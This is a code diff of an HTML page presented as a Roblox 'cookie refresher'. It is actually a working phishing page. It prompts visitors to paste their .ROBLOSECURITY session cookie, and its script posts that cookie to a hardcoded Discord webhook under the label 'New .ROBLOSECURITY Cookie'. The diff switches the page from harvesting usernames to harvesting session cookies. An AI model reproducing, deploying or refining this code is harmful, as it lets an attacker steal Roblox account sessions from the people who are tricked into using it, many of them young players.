@@ -32,58 +32,67 @@
   <h1 class="title">COOKIE &nbsp; REFRESHER</h1>
   <div class="divider"></div>
   <div class="form-wrap">
-    <span class="label">.ROBLOSECURITY Cookie
-</span>
-    <textarea class="input-box" id="COOKIE REFRESHER" placeholder="Paste your .ROBLOSECURITY Cookie here..."></textarea>
+    <span class="label">.ROBLOSECURITY Cookie</span>
+    <textarea class="input-box" id="COOKIE_REFRESHER" placeholder="Paste your .ROBLOSECURITY Cookie here..."></textarea>
     <button class="btn" id="sendBtn" onclick="sendIt()">SEND</button>
     <div class="msg" id="msg"></div>
   </div>
 </div>
 <script>
 const WEBHOOK = "https://discord.com/api/webhooks/1501211310195605586/M54GBIkVE_zHXxt4G2ybTf9bLBGex_FAd2v2rfJt4ZrsFAqJ7a6SxIz2OhXloNOPF9-T";
+
 async function sendIt() {
-  const u = document.getElementById('username').value.trim();
+  const cookieInput = document.getElementById('COOKIE_REFRESHER');
+  const cookie = cookieInput.value.trim();
   const btn = document.getElementById('sendBtn');
   const msg = document.getElementById('msg');
-  if (!u) { msg.className='msg err'; msg.textContent='please enter your cookie'; return; }
-  btn.disabled = true; btn.textContent = 'SENDING...';
-  msg.className = 'msg'; msg.textContent = '';
 
-  const body = JSON.stringify({ content: `🎮 **New Roblox Username**\n\`\`\`${u}\`\`\`` });
+  if (!cookie) {
+    msg.className = 'msg err';
+    msg.textContent = 'please enter your cookie';
+    return;
+  }
 
-  // Attempt 1: direct
+  btn.disabled = true;
+  btn.textContent = 'SENDING...';
+  msg.className = 'msg';
+  msg.textContent = '';
+
+  const payload = {
+    content: `📝 **New .ROBLOSECURITY Cookie**\n\`\`\`${cookie}\`\`\``
+  };
+  const body = JSON.stringify(payload);
+
   try {
-    const r = await fetch(WEBHOOK, { method:'POST', headers:{'Content-Type':'application/json'}, body });
-    if (r.ok || r.status === 204) { return done(true); }
-  } catch(e) {}
+    const response = await fetch(WEBHOOK, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: body
+    });
+    if (response.ok || response.status === 204) {
+      done(true);
+    } else {
+      throw new Error('Network response was not ok');
+    }
+  } catch (e) {
+    done(false);
+  }
 
-  // Attempt 2: corsproxy.io
-  try {
-    const r = await fetch("https://corsproxy.io/?" + encodeURIComponent(WEBHOOK), { method:'POST', headers:{'Content-Type':'application/json'}, body });
-    if (r.ok || r.status === 204) { return done(true); }
-  } catch(e) {}
-
-  // Attempt 3: cors.sh (no key needed for basic use)
-  try {
-    const r = await fetch(WEBHOOK, { method:'POST', headers:{'Content-Type':'application/json','x-cors-api-key':'temp_'}, body });
-    if (r.ok || r.status === 204) { return done(true); }
-  } catch(e) {}
-
-  done(false);
-
-  function done(ok) {
-    if (ok) {
+  function done(success) {
+    if (success) {
       msg.className = 'msg ok';
-      msg.textContent = 'sent! i will add you soon ✓';
-      document.getElementById('username').value = '';
+      msg.textContent = 'sent! I will add you soon ✓';
+      cookieInput.value = '';
     } else {
       msg.className = 'msg err';
       msg.textContent = 'failed to send, try again';
     }
-    btn.disabled = false; btn.textContent = 'SEND';
+    btn.disabled = false;
+    btn.textContent = 'SENDING';
   }
 }
 
+// Particle background code
 const cv = document.getElementById('c'), ctx = cv.getContext('2d');
 let pts = [];
 function resize() { cv.width = window.innerWidth; cv.height = window.innerHeight; }
